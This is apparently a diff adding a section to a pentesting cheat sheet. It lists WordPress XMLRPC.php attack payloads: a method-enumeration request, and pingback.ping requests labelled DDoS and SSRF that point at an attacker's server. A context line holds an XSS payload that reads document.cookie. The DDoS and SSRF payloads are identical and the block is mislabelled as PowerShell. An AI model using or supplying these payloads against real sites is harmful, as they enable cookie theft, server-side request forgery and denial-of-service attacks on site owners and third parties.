@@ -1468,3 +1468,38 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 
 
 ```
+
+
+#### XMLRPC.php
+
+```powershell
+
+
+List all Methods
+<methodCall>
+<methodName>system.listMethods</methodName>
+<params></params>
+</methodCall>
+
+
+DDoS
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
+
+
+SSRF 
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params><param>
+<value><string>http://<YOUR SERVER >:<port></string></value>
+</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
+</value></param></params>
+</methodCall>
+```
